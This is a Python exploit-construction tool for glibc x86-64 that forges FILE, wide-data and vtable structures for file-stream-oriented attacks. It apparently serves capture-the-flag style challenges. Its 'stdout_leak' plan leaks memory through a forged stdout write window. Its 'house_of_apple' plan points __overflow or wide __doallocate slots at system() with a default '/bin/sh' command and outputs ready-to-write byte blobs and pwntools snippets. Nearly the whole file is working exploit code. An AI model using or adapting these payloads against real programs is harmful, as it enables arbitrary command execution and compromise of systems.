#!/usr/bin/env python3
"""Offline glibc x86-64 FSOP structure builder.

The engine serializes forged ``_IO_FILE_plus``/``_IO_wide_data`` candidates; it never launches a
binary or sends a payload.  Two deliberately explicit plans are supported:

* ``stdout_leak`` places a bounded address interval in the stdout write window;
* ``house_of_apple`` prepares a call-through-wide-vtable plan.  glibc before 2.24 uses the classic
  unvalidated vtable form, 2.24--2.33 uses the validated wide-file route, and 2.34+ is labelled the
  hook-less House-of-Apple route (no ``__free_hook``/``__malloc_hook`` dependency).

All addresses are caller supplied from offline analysis.  Results contain named placement segments
and exact offsets so a human can review them before using an existing scope-locked exploit client.
The layouts are the stable LP64 glibc ``_IO_FILE`` family; other ABIs are rejected.
"""
from __future__ import annotations

import argparse
import json
import struct
import sys
from dataclasses import dataclass
from pathlib import Path


MAX_JSON = 1 << 20
MAX_BLOB = 1 << 20
UINT64_MAX = (1 << 64) - 1

FILE_SIZE = 0xD8
FILE_PLUS_SIZE = 0xE0
WIDE_DATA_SIZE = 0xE8
VTABLE_SIZE = 0x80

FILE_OFFSETS = {
    "flags": 0x00,
    "read_ptr": 0x08,
    "read_end": 0x10,
    "read_base": 0x18,
    "write_base": 0x20,
    "write_ptr": 0x28,
    "write_end": 0x30,
    "buf_base": 0x38,
    "buf_end": 0x40,
    "chain": 0x68,
    "fileno": 0x70,
    "lock": 0x88,
    "offset": 0x90,
    "codecvt": 0x98,
    "wide_data": 0xA0,
    "mode": 0xC0,
    "vtable": 0xD8,
}

WIDE_OFFSETS = {
    "read_ptr": 0x00,
    "read_end": 0x08,
    "read_base": 0x10,
    "write_base": 0x18,
    "write_ptr": 0x20,
    "write_end": 0x28,
    "buf_base": 0x30,
    "buf_end": 0x38,
    "wide_vtable": 0xE0,
}


class FSOPError(ValueError):
    """Invalid layout request or unsafe/unbounded placement."""


@dataclass(frozen=True)
class Segment:
    name: str
    address: int
    data: bytes
    purpose: str

    def as_dict(self) -> dict:
        return {"name": self.name, "address": self.address, "length": len(self.data),
                "hex": self.data.hex(), "purpose": self.purpose}


@dataclass(frozen=True)
class FSOPBuild:
    kind: str
    glibc_version: str
    strategy: str
    segments: tuple[Segment, ...]
    trigger: str
    verified_offsets: dict
    blob_address: int | None
    blob: bytes | None
    pwntools: str
    notes: tuple[str, ...]

    def as_dict(self) -> dict:
        return {
            "kind": self.kind,
            "glibc_version": self.glibc_version,
            "strategy": self.strategy,
            "segments": [segment.as_dict() for segment in self.segments],
            "trigger": self.trigger,
            "verified_offsets": self.verified_offsets,
            "blob_address": self.blob_address,
            "blob_hex": self.blob.hex() if self.blob is not None else None,
            "pwntools": self.pwntools,
            "notes": list(self.notes),
        }


def _version(value: str) -> tuple[int, int]:
    if not isinstance(value, str) or len(value) > 32:
        raise FSOPError("glibc version must be a short MAJOR.MINOR string")
    parts = value.split(".")
    if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
        raise FSOPError("glibc version must be MAJOR.MINOR")
    major, minor = int(parts[0]), int(parts[1])
    if major != 2 or not 23 <= minor <= 39:
        raise FSOPError("supported glibc versions are 2.23 through 2.39")
    return major, minor


def _address(value, name: str, *, allow_zero: bool = False) -> int:
    if isinstance(value, str):
        try:
            value = int(value, 0)
        except ValueError as exc:
            raise FSOPError(f"{name} is not an integer address") from exc
    if isinstance(value, bool) or not isinstance(value, int) or not 0 <= value <= UINT64_MAX:
        raise FSOPError(f"{name} must be an unsigned 64-bit address")
    if not allow_zero and value == 0:
        raise FSOPError(f"{name} must be non-zero")
    return value


def _put_qword(buffer: bytearray, offset: int, value: int) -> None:
    if not 0 <= offset <= len(buffer) - 8:
        raise FSOPError(f"internal qword offset {offset:#x} is outside the structure")
    struct.pack_into("<Q", buffer, offset, value & UINT64_MAX)


def _put_dword(buffer: bytearray, offset: int, value: int) -> None:
    if not 0 <= offset <= len(buffer) - 4:
        raise FSOPError(f"internal dword offset {offset:#x} is outside the structure")
    struct.pack_into("<I", buffer, offset, value & 0xFFFFFFFF)


def _combine(segments: tuple[Segment, ...]) -> tuple[int | None, bytes | None]:
    ordered = sorted(segments, key=lambda segment: segment.address)
    if any(segment.address + len(segment.data) > UINT64_MAX + 1 for segment in ordered):
        raise FSOPError("placement segment crosses the 64-bit address space")
    start = ordered[0].address
    end = max(segment.address + len(segment.data) for segment in ordered)
    if end - start > MAX_BLOB:
        return None, None
    blob = bytearray(end - start)
    occupied: list[tuple[int, int]] = []
    for segment in ordered:
        lo, hi = segment.address - start, segment.address - start + len(segment.data)
        if any(not (hi <= old_lo or lo >= old_hi) for old_lo, old_hi in occupied):
            raise FSOPError("placement segments overlap")
        blob[lo:hi] = segment.data
        occupied.append((lo, hi))
    return start, bytes(blob)


def _pwntools(segments: tuple[Segment, ...]) -> str:
    lines = ["from pwn import p64", "# Offline placement map; write with the existing scoped exploit client."]
    for segment in segments:
        lines.append(f"{segment.name} = bytes.fromhex({segment.data.hex()!r})  # {segment.address:#x}")
    lines.append("segments = {")
    for segment in segments:
        lines.append(f"    {segment.address:#x}: {segment.name},")
    lines.append("}")
    return "\n".join(lines) + "\n"


def _stdout_leak(version: str, cfg: dict) -> FSOPBuild:
    file_addr = _address(cfg.get("file_addr", 0), "file_addr", allow_zero=True)
    leak_start = _address(cfg.get("leak_start"), "leak_start", allow_zero=True)
    leak_end = _address(cfg.get("leak_end"), "leak_end", allow_zero=True)
    lock = _address(cfg.get("lock"), "lock")
    vtable = _address(cfg.get("io_file_jumps", cfg.get("vtable")), "io_file_jumps")
    if leak_end <= leak_start or leak_end - leak_start > MAX_BLOB:
        raise FSOPError("leak interval must be increasing and at most 1 MiB")
    fp = bytearray(FILE_PLUS_SIZE)
    _put_dword(fp, FILE_OFFSETS["flags"], 0xFBAD1800)
    _put_qword(fp, FILE_OFFSETS["read_end"], leak_start)
    _put_qword(fp, FILE_OFFSETS["write_base"], leak_start)
    _put_qword(fp, FILE_OFFSETS["write_ptr"], leak_end)
    _put_qword(fp, FILE_OFFSETS["write_end"], leak_end)
    _put_qword(fp, FILE_OFFSETS["buf_base"], leak_start)
    _put_qword(fp, FILE_OFFSETS["buf_end"], leak_end)
    _put_dword(fp, FILE_OFFSETS["fileno"], 1)
    _put_qword(fp, FILE_OFFSETS["lock"], lock)
    _put_qword(fp, FILE_OFFSETS["offset"], UINT64_MAX)
    _put_dword(fp, FILE_OFFSETS["mode"], 0)
    _put_qword(fp, FILE_OFFSETS["vtable"], vtable)
    segment = Segment("fake_stdout", file_addr, bytes(fp),
                      "_IO_FILE_plus write window covering the requested leak interval")
    return FSOPBuild(
        kind="stdout_leak", glibc_version=version, strategy="stdout-write-window",
        segments=(segment,), trigger="cause libc to flush/use the forged stdout object",
        verified_offsets={"_flags": 0, "_IO_write_base": 0x20, "_IO_write_ptr": 0x28,
                          "_fileno": 0x70, "_lock": 0x88, "vtable": 0xD8},
        blob_address=file_addr, blob=bytes(fp), pwntools=_pwntools((segment,)),
        notes=("The leak interval is bounded to 1 MiB.",
               "The caller must supply the target libc's real _IO_file_jumps and writable lock."),
    )


def _house_of_apple(version: str, version_tuple: tuple[int, int], cfg: dict) -> FSOPBuild:
    file_addr = _address(cfg.get("file_addr"), "file_addr")
    lock = _address(cfg.get("lock"), "lock")
    system = _address(cfg.get("system"), "system")
    fp = bytearray(FILE_PLUS_SIZE)
    command = cfg.get("command", "  /bin/sh")
    if not isinstance(command, str):
        raise FSOPError("command must be text")
    try:
        command_raw = command.encode("utf-8")
    except UnicodeEncodeError as exc:
        raise FSOPError("command must be UTF-8 encodable text") from exc
    if not (command_raw.startswith(b"  ") and 1 <= len(command_raw) <= 0x20 and b"\x00" not in command_raw):
        raise FSOPError("command must be 1..32 bytes, NUL-free, and begin with two spaces")
    fp[:len(command_raw)] = command_raw
    fp[len(command_raw)] = 0
    _put_qword(fp, FILE_OFFSETS["write_base"], 0)
    _put_qword(fp, FILE_OFFSETS["write_ptr"], 1)
    _put_qword(fp, FILE_OFFSETS["lock"], lock)
    _put_qword(fp, FILE_OFFSETS["offset"], UINT64_MAX)

    if version_tuple < (2, 24):
        vtable_addr = _address(cfg.get("vtable_addr"), "vtable_addr")
        vtable = bytearray(VTABLE_SIZE)
        _put_qword(vtable, 0x18, system)  # __overflow slot in _IO_jump_t
        _put_qword(fp, FILE_OFFSETS["vtable"], vtable_addr)
        segments = (
            Segment("fake_file", file_addr, bytes(fp), "legacy _IO_FILE_plus with controlled vtable"),
            Segment("fake_vtable", vtable_addr, bytes(vtable), "legacy __overflow slot -> system"),
        )
        strategy = "legacy-unvalidated-vtable"
        trigger = "invoke an _IO_OVERFLOW path on the forged stream"
        notes = ("glibc before 2.24 did not enforce IO_validate_vtable.",
                 "system receives the fake FILE pointer, whose first bytes are the command string.")
        verified = {"command": 0, "_IO_write_base": 0x20, "_IO_write_ptr": 0x28,
                    "_lock": 0x88, "vtable": 0xD8, "vtable.__overflow": 0x18}
    else:
        wide_data_addr = _address(cfg.get("wide_data_addr"), "wide_data_addr")
        wide_vtable_addr = _address(cfg.get("wide_vtable_addr"), "wide_vtable_addr")
        io_wfile_jumps = _address(cfg.get("io_wfile_jumps"), "io_wfile_jumps")
        wide = bytearray(WIDE_DATA_SIZE)
        wide_vtable = bytearray(VTABLE_SIZE)
        _put_qword(fp, FILE_OFFSETS["wide_data"], wide_data_addr)
        _put_dword(fp, FILE_OFFSETS["mode"], 1)
        _put_qword(fp, FILE_OFFSETS["vtable"], io_wfile_jumps)
        _put_qword(wide, WIDE_OFFSETS["write_base"], 0)
        _put_qword(wide, WIDE_OFFSETS["write_ptr"], 1)
        _put_qword(wide, WIDE_OFFSETS["buf_base"], 0)
        _put_qword(wide, WIDE_OFFSETS["wide_vtable"], wide_vtable_addr)
        _put_qword(wide_vtable, 0x68, system)  # __doallocate in _IO_jump_t
        segments = (
            Segment("fake_file", file_addr, bytes(fp), "validated _IO_wfile_jumps FILE object"),
            Segment("fake_wide_data", wide_data_addr, bytes(wide), "_IO_wide_data allocation path"),
            Segment("fake_wide_vtable", wide_vtable_addr, bytes(wide_vtable),
                    "wide __doallocate slot -> system"),
        )
        strategy = "hookless-house-of-apple" if version_tuple >= (2, 34) else "validated-wide-vtable"
        trigger = "reach _IO_wfile_overflow on the forged stream so __doallocate(fake_file) is called"
        notes = (("glibc 2.34+ hook-less plan: no malloc/free hook is used."
                  if version_tuple >= (2, 34) else
                  "Uses a validated libc _IO_wfile_jumps pointer; does not rely on an arbitrary main vtable."),
                 "system receives the fake FILE pointer, whose first bytes are a space-prefixed command.",
                 "The exact trigger remains challenge-specific and is intentionally not sent or executed here.")
        verified = {"command": 0, "_IO_write_base": 0x20, "_IO_write_ptr": 0x28,
                    "_lock": 0x88, "_wide_data": 0xA0, "_mode": 0xC0, "vtable": 0xD8,
                    "wide._IO_write_base": 0x18, "wide._IO_buf_base": 0x30,
                    "wide._wide_vtable": 0xE0, "wide_vtable.__doallocate": 0x68}
    blob_address, blob = _combine(segments)
    return FSOPBuild(kind="house_of_apple", glibc_version=version, strategy=strategy,
                     segments=segments, trigger=trigger, verified_offsets=verified,
                     blob_address=blob_address, blob=blob, pwntools=_pwntools(segments), notes=notes)


def build_fsop(kind: str, glibc_version: str, **config) -> FSOPBuild:
    """Build a reviewed FSOP placement plan for the LP64 glibc layout."""
    if config.pop("arch", "amd64") not in ("amd64", "x86_64"):
        raise FSOPError("FSOP builder currently supports only glibc x86-64 LP64")
    normalized = kind.replace("-", "_") if isinstance(kind, str) else kind
    version_tuple = _version(glibc_version)
    if normalized == "stdout_leak":
        return _stdout_leak(glibc_version, config)
    if normalized == "house_of_apple":
        return _house_of_apple(glibc_version, version_tuple, config)
    raise FSOPError("kind must be stdout_leak or house_of_apple")


class _Parser(argparse.ArgumentParser):
    def error(self, message: str) -> None:  # pragma: no cover
        raise FSOPError(message)


def _config(path: str) -> dict:
    with Path(path).open("rb") as handle:
        raw = handle.read(MAX_JSON + 1)
    if len(raw) > MAX_JSON:
        raise FSOPError("JSON input exceeds 1 MiB cap")
    try:
        value = json.loads(raw.decode("utf-8"))
    except (UnicodeError, json.JSONDecodeError) as exc:
        raise FSOPError(f"invalid JSON: {exc}") from exc
    if not isinstance(value, dict):
        raise FSOPError("JSON root must be an object")
    return value


def main(argv: list[str] | None = None) -> int:
    parser = _Parser(prog="pwn_fsop.py")
    parser.add_argument("kind", choices=("stdout_leak", "house_of_apple"))
    parser.add_argument("input", help="bounded JSON address/config object")
    parser.add_argument("--json", action="store_true")
    try:
        try:
            args = parser.parse_args(argv)
        except SystemExit as exc:
            # argparse's -h/--help action prints and raises SystemExit(0); turn
            # it into a normal status code instead of letting it escape main().
            return 0 if exc.code in (0, None) else 2
        cfg = _config(args.input)
        version = cfg.pop("glibc_version")
        result = build_fsop(args.kind, str(version), **cfg)
        if args.json:
            print(json.dumps(result.as_dict(), sort_keys=True))
        else:
            print(f"CANDIDATE [layout-checked] {result.strategy}")
            for segment in result.segments:
                print(f"  {segment.name} @{segment.address:#x} ({len(segment.data):#x} bytes): {segment.data.hex()}")
            print(f"  trigger: {result.trigger}")
        return 0
    except (KeyError, OSError, FSOPError, TypeError, ValueError, OverflowError,
            RecursionError, MemoryError) as exc:
        print(f"pwn_fsop: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    raise SystemExit(main())
